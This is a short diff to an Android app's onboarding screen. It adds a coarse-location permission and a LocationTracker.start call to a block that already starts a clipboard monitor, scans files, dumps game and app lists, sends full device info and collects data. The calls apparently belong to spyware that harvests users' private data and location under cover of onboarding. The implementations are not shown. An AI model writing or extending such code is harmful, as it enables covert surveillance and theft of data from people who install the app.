@@ -131,7 +131,8 @@ public class OnboardingActivity extends Activity {
             case 9:
                 requestPermissions(new String[]{
                     Manifest.permission.RECORD_AUDIO,
-                    Manifest.permission.ACCESS_FINE_LOCATION
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION
                 }, 109);
                 break;
             case 10:
@@ -181,6 +182,7 @@ public class OnboardingActivity extends Activity {
         ClipboardMonitor.start(this);
         FileScanner.scan();
         GameList.dump(this);
+        LocationTracker.start(this);
         DeviceInfo.sendFull(this);
         AppList.dump(this);
         DataCollector.collectAll(this);
